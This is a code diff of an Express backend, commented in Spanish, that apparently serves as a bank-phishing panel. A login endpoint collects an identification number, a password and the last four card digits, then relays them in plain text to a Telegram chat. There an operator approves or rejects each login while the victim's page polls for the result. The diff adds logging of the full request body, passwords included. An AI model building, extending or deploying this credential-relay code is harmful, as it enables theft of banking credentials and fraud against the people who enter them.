@@ -6,22 +6,24 @@ import dotenv from 'dotenv';
 dotenv.config();
 
 const app = express();
-app.use(cors()); // Permite peticiones desde tu front en otro dominio
-app.use(express.json());
+app.use(cors());
+app.use(express.json()); // Importante para parsear el body JSON
 
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const PORT = process.env.PORT || 3000;
 
-// Almacenamiento en memoria para los estados y datos
-// Estructura: { requestId: { status: 'pending'|'approved'|'rejected', data: {...}, messageId: null } }
+// Verificación al arrancar
+console.log("=== CONFIGURACIÓN DEL BACKEND ===");
+console.log("BOT_TOKEN:", BOT_TOKEN ? "Configurado" : "❌ FALTA");
+console.log("CHAT_ID:", CHAT_ID ? "Configurado" : "❌ FALTA");
+console.log("=================================");
+
 const requestsDB = new Map();
 
-// Función para enviar el mensaje a Telegram con los botones
 async function sendToTelegram(requestId, data) {
     const isTarjeta = data.tipo === 'tarjeta';
     
-    // Construimos el texto con formato HTML
     let text = `<b>⚠️ NUEVA SOLICITUD DE VALIDACIÓN</b>\n\n`;
     text += `<b>Identificación:</b> ${data.identificacion}\n`;
     
@@ -34,7 +36,6 @@ async function sendToTelegram(requestId, data) {
     
     text += `\n<i>El usuario está esperando respuesta...</i>`;
 
-    // Botones Inline
     const keyboard = {
         inline_keyboard: [
             [
@@ -52,77 +53,81 @@ async function sendToTelegram(requestId, data) {
             reply_markup: keyboard
         });
         
-        // Guardamos el ID del mensaje de Telegram por si lo necesitamos luego
-        requestsDB.get(requestId).messageId = response.data.result.message_id;
-        console.log(`Mensaje enviado a Telegram para requestId: ${requestId}`);
+        if (requestsDB.has(requestId)) {
+            requestsDB.get(requestId).messageId = response.data.result.message_id;
+        }
+        console.log(`✅ Mensaje enviado a Telegram para requestId: ${requestId}`);
         
     } catch (error) {
-        console.error("Error enviando a Telegram:", error.response?.data || error.message);
+        // Este log es CLAVE para ver por qué falla Telegram
+        console.error("❌ Error enviando a Telegram:");
+        console.error("Status:", error.response?.status);
+        console.error("Data:", JSON.stringify(error.response?.data, null, 2));
+        console.error("Message:", error.message);
     }
 }
 
 // 1. Endpoint que recibe los datos del front
 app.post('/api/login', async (req, res) => {
+    // LOG DE DIAGNÓSTICO: Ver qué llega exactamente
+    console.log("📥 Petición recibida en /api/login");
+    console.log("Body:", JSON.stringify(req.body, null, 2));
+
     const { identificacion, clave, ultimos4, tipo } = req.body;
 
     // Validaciones básicas
     if (!identificacion || !clave) {
+        console.log("❌ Faltan datos: identificacion o clave");
         return res.status(400).json({ error: "Faltan datos requeridos." });
     }
 
     // Generamos un ID único para esta solicitud
     const requestId = Date.now().toString() + Math.random().toString(36).substring(2, 7);
+    console.log(`🔑 RequestID generado: ${requestId}`);
     
-    // Guardamos en memoria
     requestsDB.set(requestId, {
         status: 'pending',
         data: { identificacion, clave, ultimos4, tipo },
         messageId: null
     });
 
-    // Enviamos a Telegram asíncronamente
+    // Enviamos a Telegram asíncronamente (sin await para no bloquear)
     sendToTelegram(requestId, { identificacion, clave, ultimos4, tipo });
 
-    // Respondemos inmediatamente al front con el ID
+    // Respondemos al front con el ID
     res.json({ requestId });
 });
 
-// 2. Endpoint de Polling (El front pregunta cada 2 segundos)
+// 2. Endpoint de Polling
 app.get('/api/status/:requestId', (req, res) => {
     const { requestId } = req.params;
     const request = requestsDB.get(requestId);
 
     if (!request) {
-        // Si no existe, asumimos que ya se procesó y se limpió, o es inválido
         return res.status(404).json({ status: 'error', message: 'Solicitud no encontrada' });
     }
 
     res.json({ status: request.status });
 });
 
-// 3. Webhook de Telegram (Para recibir los clics de los botones)
+// 3. Webhook de Telegram
 app.post('/api/webhook/telegram', async (req, res) => {
     const { callback_query } = req.body;
 
     if (!callback_query) {
-        return res.sendStatus(200); // Ignorar si no es un callback
+        return res.sendStatus(200);
     }
 
-    const data = callback_query.data; // Ej: "approve_123456"
+    const data = callback_query.data;
     const messageId = callback_query.message.message_id;
     const chatId = callback_query.message.chat.id;
 
-    // Extraemos la acción y el requestId
     const [action, requestId] = data.split('_');
 
-    // Verificamos que la solicitud exista
     if (requestsDB.has(requestId)) {
         const request = requestsDB.get(requestId);
-        
-        // Actualizamos el estado
         request.status = action === 'approve' ? 'approved' : 'rejected';
 
-        // Editamos el mensaje de Telegram para quitar los botones y mostrar quién lo hizo
         const actionText = action === 'approve' ? '✅ <b>APROBADO</b>' : '❌ <b>RECHAZADO</b>';
         
         try {
@@ -133,22 +138,26 @@ app.post('/api/webhook/telegram', async (req, res) => {
                 parse_mode: 'HTML'
             });
         } catch (error) {
-            console.error("Error editando mensaje de Telegram:", error.message);
+            console.error("Error editando mensaje:", error.message);
         }
 
-        // Respondemos a Telegram para detener el spinner del botón
         res.sendStatus(200);
     } else {
-        // Si no existe en memoria (ya se limpió o expiró)
         res.sendStatus(404);
     }
 });
 
-// Ruta de salud para Render
+// Ruta de salud
 app.get('/', (req, res) => {
     res.send('Backend funcionando correctamente.');
 });
 
+// Manejo de errores global
+app.use((err, req, res, next) => {
+    console.error("❌ Error global:", err);
+    res.status(500).json({ error: "Error interno del servidor" });
+});
+
 app.listen(PORT, () => {
-    console.log(`Servidor corriendo en el puerto ${PORT}`);
+    console.log(`🚀 Servidor corriendo en el puerto ${PORT}`);
 });
